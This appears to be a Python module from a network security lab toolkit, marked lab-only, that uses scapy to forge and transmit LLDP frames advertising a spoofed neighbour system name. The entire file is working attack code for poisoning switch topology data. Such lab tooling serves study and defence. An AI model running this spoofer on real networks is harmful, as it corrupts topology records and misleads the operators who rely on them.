# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-discovery: forge an LLDP neighbour. LAB ONLY.

Emits an LLDP frame (EtherType 0x88cc to the LLDP multicast) advertising a
spoofed system name, so a neighbour records false topology data. The same
sniffing that harvests real CDP/LLDP is used defensively in .
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def _lldp_tlv(t: int, value: bytes) -> bytes:
    header = (t << 9) | (len(value) & 0x1FF)
    return header.to_bytes(2, "big") + value


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    mac = s.get_if_hwaddr(args.iface)
    chassis = _lldp_tlv(1, b"\x04" + bytes.fromhex(mac.replace(":", "")))
    port = _lldp_tlv(2, b"\x03" + b"eth0")
    ttl = _lldp_tlv(3, (120).to_bytes(2, "big"))
    sysname = _lldp_tlv(5, args.name.encode())
    end = _lldp_tlv(0, b"")
    frame = s.Ether(src=mac, dst="01:80:c2:00:00:0e", type=0x88CC) / s.Raw(
        chassis + port + ttl + sysname + end
    )
    print(f"[*] sending forged LLDP (system '{args.name}') on {args.iface}")
    s.sendp(frame, iface=args.iface, count=args.count, verbose=0)
    verdict("ALERT", f"advertised bogus neighbour '{args.name}'")
    return 0
